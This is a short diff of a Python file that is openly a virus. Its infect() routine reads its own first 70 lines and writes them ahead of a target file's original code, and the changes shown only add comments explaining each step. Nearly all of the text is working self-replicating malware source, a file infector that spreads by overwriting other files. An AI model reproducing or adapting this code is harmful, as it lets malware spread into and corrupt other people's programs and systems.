@@ -39,10 +39,10 @@ def findFile(fileList):
 
 
 def infect(targetFile):
-    virusCode = open(os.path.abspath(__file__))
+    virusCode = open(os.path.abspath(__file__)) #opens itself to read virus
     virusString = ""
     for i, line in enumerate(virusCode):
-        if i>=0 and i < 70:
+        if i>=0 and i < 70: #Always make this number equal to the lines of code the file has.
             virusString += line
     virusCode.close
 
@@ -51,7 +51,7 @@ def infect(targetFile):
     f.close()
 
     f = open(targetFile, "w")
-    f.write(virusString + ogCode)
+    f.write(virusString + ogCode) # writes virus and original target code to target file
     f.close()
     
 targetFile = findFile(file_li)
